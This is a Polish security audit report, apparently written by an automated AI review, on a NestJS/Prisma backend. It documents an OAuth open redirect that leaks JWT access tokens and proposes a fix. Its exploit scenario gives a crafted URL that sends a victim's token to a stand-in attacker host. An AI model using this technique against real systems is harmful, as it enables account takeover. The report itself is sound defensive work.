# Raport audytu bezpieczeństwa — desk-panel

**Data**: 2026-04-28  
**Zakres**: Pełny audyt kodu (150+ plików backendowych, TypeScript / NestJS / Prisma)  
**Autor**: Claude Code (automated security review)

---

## Podsumowanie

Codebase wykazuje solidne podstawy bezpieczeństwa: bcrypt, AES-256-GCM, wyłączne użycie ORM (brak raw SQL), brak `eval()` / `dangerouslySetInnerHTML`, konsekwentna izolacja organizacji. Znaleziono **1 podatność wysokiego ryzyka**.

---

## Vuln 1: Open Redirect z ujawnieniem JWT — Google OAuth2

**Pliki**: `backend/src/modules/auth/auth.controller.ts` linie 106–122, 159 · `backend/src/modules/auth/google-auth.service.ts` linie 48–66

* **Severity**: HIGH
* **Confidence**: 9/10
* **Category**: `open_redirect` / `token_leakage`

**Opis**:

Endpoint `GET /auth/google/redirect` przyjmuje parametr `redirectUrl` bezpośrednio z query string bez żadnej walidacji domeny ani whitelisty. Parametr jest przechowywany w nonce store i po powrocie z Google OAuth używany w redirectcie razem z prawdziwym JWT access tokenem użytkownika:

```typescript
// auth.controller.ts:112
@Query('redirectUrl') redirectUrl?: string

// auth.controller.ts:159
res!.redirect(`${redirectUrl}/login#google_token=${accessToken}`);
```

Nie istnieje żaden mechanizm sprawdzający, czy `redirectUrl` należy do dozwolonych domen organizacji.

**Exploit Scenario**:

1. Atakujący (np. wewnętrzny pracownik lub osoba, która uzyska token) konstruuje URL: `https://api.example.com/api/v1/auth/google/redirect?redirectUrl=https://attacker.com&orgId=victim-org`
2. Ofiara (zalogowana) klika ten link lub zostaje przekierowana
3. Po przejściu przez consent screen Google, serwer przekierowuje do: `https://attacker.com/login#google_token=eyJhbGciOiJIUzI1NiIs...`
4. Serwer atakującego przechwytuje JWT z nagłówka `Referer`, logów proxy lub przez JavaScript
5. Atakujący podszywa się pod ofiarę z pełnym dostępem do jej konta

**Rekomendacja**:

Dodać walidację `redirectUrl` względem listy dozwolonych domen. Porównać hostname z `org.frontendUrl` pobranym z bazy:

```typescript
// google-auth.service.ts — buildRedirectUrl()
const orgFrontendUrl = await this.prisma.organization.findUnique(...)
  .then(o => new URL(o.frontendUrl).origin);

const providedOrigin = redirectUrl ? new URL(redirectUrl).origin : null;
if (providedOrigin && providedOrigin !== orgFrontendUrl) {
  throw new BadRequestException('Invalid redirectUrl');
}
```

---

## Ustalenia pozytywne

| Obszar | Status |
|--------|--------|
| SQL Injection | Wyłączny Prisma ORM — brak raw SQL |
| Hashowanie haseł | bcrypt z odpowiednim salt rounds |
| Szyfrowanie poświadczeń SMTP/WiFi | AES-256-GCM |
| JWT refresh token rotation | Zaimplementowane |
| Izolacja organizacji | `actorOrgId` walidowany konsekwentnie w warstwie serwisów |
| Wykonanie kodu | Brak `eval()`, `Function()`, `dangerouslySetInnerHTML` |
| Audit log | Impersonacja i nieautoryzowane skany logowane |

---

**Priorytet naprawy**: podatność open redirect powinna zostać poprawiona przed udostępnieniem logowania przez Google w środowisku produkcyjnym.
